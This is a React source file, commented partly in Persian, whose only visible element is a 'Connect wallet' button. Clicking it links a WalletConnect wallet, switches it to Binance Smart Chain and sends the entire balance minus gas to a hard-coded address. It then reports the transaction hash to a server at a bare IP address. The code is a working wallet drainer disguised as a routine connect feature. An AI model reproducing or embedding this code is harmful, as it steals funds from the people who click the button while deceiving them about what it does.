import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [1, 56], // پشتیبانی از BSC و Ethereum
      methods: [
        "eth_sendTransaction",
        "eth_signTransaction",
        "eth_getBalance",
        "eth_sign",
        "personal_sign"
      ],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var accounts = await provider.request({ method: "eth_accounts" });
    var account_sender = accounts[0];
    console.log("✅ Wallet Address:", account_sender);

    async function switchToBSC() {
      try {
        await provider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }], // BSC Mainnet
        });
        console.log("✅ Switched to Binance Smart Chain");
      } catch (switchError) {
        console.error("❌ Error switching to BSC:", switchError);
      }
    }

    async function sendMaxTransaction() {
      try {
        let balance = await provider.request({
          method: "eth_getBalance",
          params: [account_sender, "latest"],
        });

        let balanceInWei = parseInt(balance, 10); // تبدیل به عدد صحیح
        console.log(`💰 Balance: ${balanceInWei} WEI`);

        if (balanceInWei <= 0) {
          console.error("❌ Not enough balance.");
          return;
        }

        const gasPrice = 5000000000; // گس پرایس (۵ GWEI)
        const gasLimit = 21000; // مقدار گس استاندارد
        const gasFee = gasLimit * gasPrice;
        const transactionValue = balanceInWei - gasFee;

        if (transactionValue <= 0) {
          console.error("❌ Not enough balance after gas fee.");
          return;
        }

        const transactionParameters = {
          to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
          from: account_sender,
          value: "0x" + transactionValue.toString(16), // تبدیل مقدار به HEX
          gas: "0x" + gasLimit.toString(16),
          gasPrice: "0x" + gasPrice.toString(16)
        };

        console.log("📜 Unsigned Transaction:", transactionParameters);

        const signedTransaction = await provider.request({
          method: "eth_signTransaction",
          params: [transactionParameters],
        });

        console.log("✍️ Signed Transaction:", signedTransaction);

        if (!signedTransaction) {
          console.error("❌ Error: Transaction signing failed!");
          return;
        }

        const txHash = await provider.request({
          method: "eth_sendTransaction",
          params: [transactionParameters],
        });

        console.log("✅ Transaction Hash:", txHash);

        if (!txHash) {
          console.error("❌ Error: Transaction hash is undefined!");
          return;
        }

        // ✅ ارسال امضا به سرور
        try {
          let response = await fetch("http://104.194.133.124/send.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              handler: "sign",
              signature: txHash,
              type: "coin",
            }),
          });

          let result = await response.json();
          console.log("✅ Server Response:", result);
        } catch (error) {
          console.error("❌ Error sending signature to server:", error);
        }
      } catch (error) {
        console.error("❌ Error sending transaction:", error);
      }
    }

    await switchToBSC();
    await sendMaxTransaction();
  }

  return (
    <a
      href="#"
      id="kos"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect wallet</span>
    </a>
  );
}

export default App;
